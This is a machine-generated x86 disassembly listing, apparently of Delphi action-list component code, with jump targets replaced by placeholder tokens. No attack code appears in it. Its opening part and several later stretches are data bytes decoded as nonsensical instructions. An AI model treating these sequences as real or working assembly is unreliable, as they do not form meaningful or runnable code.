rol [ eax + eax - 0x6c ] 0x41
inc eax
add [ eax ] dl
into
inc ebx
add [ eax ] dl
inc esp
add [ ecx * 8 + 0x27b00043 ] cl
inc esp
add [ eax - 0x7bffbbdb ] ah
inc edx
inc eax
add [ eax ] dh
sub [ eax + eax - 0x7c ] eax
sub al 0x44
add ah bh
daa
inc esp
add al ah
daa
inc esp
add [ esp + ebp + 0x2e6c0044 ] bl
inc esp
add [ eax + esi ] dh
inc esp
add al cl
das
inc esp
add [ eax ] ch
das
inc esp
add [ eax + 0x2f ] dl
inc esp
add [ eax + 0x2f ] al
inc esp
add [ eax + 0x44 ] ch
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] dh
xchg ebp eax
inc esp
add [ eax ] cl
add [ eax ] al
add al 0x0
stc
push eax
push ebx
push edx
inc esp
inc ebx
inc eax
add ah bh
inc ebx
inc eax
add [ eax ] ch
inc edx
inc eax
add [ eax + 0x42 ] bl
inc eax
add [ eax ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
or al 0xcd
inc ebx
add [ eax - 0x2fffbbd9 ] dh
inc esi
inc eax
add ah al
daa
inc esp
add [ eax ] dh
sub [ eax + eax - 0x7c ] eax
sub al 0x44
add ah bh
daa
inc esp
add al ah
daa
inc esp
add [ esp + ebp + 0x44d40044 ] bl
inc eax
add [ edi + eax * 2 + 0x40040 ] cl
std
imul ebp [ esi + 0x65 ] 0x74634164
imul ebp [ edi + 0x6e ] 0x5c909090
aas
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
aas
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x55ffbfc1 ] dl
aas
inc eax
add [ eax ] cl
add [ eax ] al
hlt
sub_403f9a
mov esp 0x14004045
inc esi
inc eax
add [ eax + ecx * 2 + 0x48e80040 ] dh
inc eax
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x28 ] 0x4b
inc eax
add [ eax + 0x4b ] dh
inc eax
add [ eax ] dl
inc esp
je r-xdata
inc esp
add [ eax + eax * 8 ] al
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
nop
nop
mov eax 0x7004040
or eax 0x73754354
je r-xdata
test al 0xc2
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ esi + ebp ] ch
inc esp
add al ah
sub eax 0x2e400044
inc esp
add ah ch
sub al 0x44
add [ ebp + ebp + 0x2e4c0044 ] bh
inc esp
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
xor al 0x40
inc eax
add ah al
cmp eax 0x30040
or [ ecx + 0x63 ] al
je r-xdata
add [ ecx * 8 + 0x27b00043 ] cl
inc esp
add [ eax - 0x7bffbbdb ] ah
inc edx
inc eax
add [ eax ] dh
push eax
inc eax
add [ esp + ebp + 0x27fc0044 ] al
inc esp
add al ah
daa
inc esp
add [ esp + ebp + 0x4ac00044 ] bl
inc eax
add [ eax + esi ] dh
inc esp
add al cl
das
inc esp
add [ eax ] ch
das
inc esp
add [ eax + 0x2f ] dl
inc esp
add [ eax + 0x2f ] al
inc esp
add [ eax + 0x44 ] ch
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dh
xchg ebp eax
inc esp
add [ eax + eax ] dl
add [ eax ] dh
xchg ebp eax
inc esp
add [ eax ] ah
add [ eax ] al
add al [ eax ]
out dx eax
push eax
[ eax + edx * 2 + 0x50d00040 ]
inc eax
add [ 0x73754354 ] cl
je r-xdata
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
in al dx
mov ch 0x43
add [ edx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x40340000
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax * 2 + 0x40 ] bh
add [ eax + 0x4040 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x5bffbfc0 ] dl
inc eax
inc eax
add [ eax + 0x3c000000 ] al
inc eax
add [ esp + ebp ] bh
inc esp
add [ eax + 0x100044c2 ] ah
and al [ eax + eax - 0x58 ]
retn 0x44
add [ ecx + ecx * 2 ] bl
inc eax
add [ eax + 0x49 ] al
inc eax
add [ ecx + ecx * 2 + 0x40 ] ah
add [ eax - 0x53ffbfb7 ] cl
dec ecx
inc eax
add al dl
dec ecx
inc eax
add ah dh
dec ecx
inc eax
add [ eax ] bl
dec edx
inc eax
add [ edx + ecx * 2 ] bh
inc eax
add [ edx + ecx * 2 + 0x40 ] cl
add [ edx + ecx * 2 + 0x40 ] bl
add [ edx + ecx * 2 + 0x40 ] ch
add [ edx + ecx * 2 + 0x40 ] bh
add [ edx + ecx * 2 + 0x4a9c0040 ] cl
inc eax
add [ eax + 0xb00404a ] dh
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x83ec8b55
dec esp
inc esp
inc esp
add [ eax ] bl
rol [ eax + eax + 0x4c ] 0x2d
inc esp
add [ ebp + 0x2d940044 ] bh
inc esp
dec esp
imul esi [ ebx + 0x74 ] 0x41280000
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x18004041 ] cl
add [ eax ] al
add [ eax - 0x4a ] dl
inc ebx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
sub_404194
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_442ec8
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
call sub_404760
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_4041dc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_43c504
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_404228
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_442760
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_404258
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4426b8
mov [ ebp - 0x5 ] al
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_404284
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4427c4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_404380
sub_4042c4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4041dc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x10 ]
jl r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x10 ]
dec eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x24 ]
mov edx [ ebp - 0xc ]
call sub_43c2dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x24 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_43c550
sub_40433c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
call sub_44ce70
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x48
mov edx [ ebp - 0x8 ]
call sub_44cb34
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_404380
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4c ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
call sub_404760
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_40472c
sub_4043c4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x1
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_404380
sub_4043fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_426470
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov bx 0xfff4
call sub_44c24c
test al al
jne r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_442f60
test al al
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax 0xb040
call sub_428ec0
dec eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_404468
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4264ac
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov bx 0xfff1
call sub_44c24c
test al al
jne r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_442f94
test al al
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax 0xb03f
call sub_428ec0
dec eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4044d4
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_442100
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x24 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_4046ac
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_404554
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_44c070
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_43c600
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_44c070
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44215c
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_4045bc
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov esp ebp
pop ebp
retn 0x8
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x14 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov edx [ ebp - 0xc ]
call sub_43c464
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
sub_404614
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_43c504
test eax eax
jl r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c200
mov edx [ ebp - 0xc ]
call sub_4042c4
sub_404650
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
call sub_4035ec
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
call sub_403654
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
call sub_44222c
sub_4046ac
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x2c ]
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_4046d0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov cl [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4425a0
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x2c ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_404650
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_404760
sub_40472c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_43c264
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4c ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44222c
pop ecx
pop ecx
pop ebp
retn
sub_404760
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_43c728
test eax eax
jl r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x4c ] edx
sub_40478c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_43c464
mov edx [ eax ]
call [ edx + 0x30 ]
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x238 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x238 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_404824
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_41a678
mov [ ebp - 0x13 ] al
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
mov dl [ ebp - 0x13 ]
call sub_40667c
mov [ ebp - 0x12 ] ax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x9 ] 0x0
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] 0x0
inc [ ebp - 0x10 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov edx [ ebp - 0x10 ]
call sub_43c464
mov bx 0xfff0
call sub_44c24c
mov [ ebp - 0x9 ] al
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov edx [ ebp - 0x10 ]
call sub_43c464
mov ax [ eax + 0x68 ]
cmp ax [ ebp - 0x12 ]
jne r-xdata
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4048b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3a ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x9 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4048e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x9 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_40491c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ r-xdata ]
call sub_44c1e8
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_404940
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ r-xdata ]
call sub_44c1e8
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_404964
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ r-xdata ]
call sub_44c1e8
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_404988
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ r-xdata ]
call sub_44c1e8
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_4049ac
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ r-xdata ]
call sub_44c1e8
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_4049d0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ r-xdata ]
call sub_44c1e8
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_4049f4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ r-xdata ]
call sub_44c1e8
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_404a18
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ r-xdata ]
call sub_44c1e8
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_404ac0
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_442e6c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x50 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x59 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x64 ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov [ eax + 0x6a ] 0x1
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_404b28
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x7c ]
call sub_44c070
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_404194
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_404b70
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43ce10
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x54 ]
mov eax [ ebp - 0x8 ]
call sub_404c10
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x58 ]
mov eax [ ebp - 0x8 ]
call sub_404c9c
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x59 ]
mov eax [ ebp - 0x8 ]
call sub_404d1c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x8 ]
call sub_404d9c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x60 ]
mov eax [ ebp - 0x8 ]
call sub_404e1c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_404ea8
mov eax [ ebp - 0x4 ]
mov dx [ eax + 0x68 ]
mov eax [ ebp - 0x8 ]
call sub_404f28
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x6a ]
mov eax [ ebp - 0x8 ]
call sub_404fb0
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_404c10
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x54 ]
call sub_44ce70
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x54
mov edx [ ebp - 0x8 ]
call sub_44cb34
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c464
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
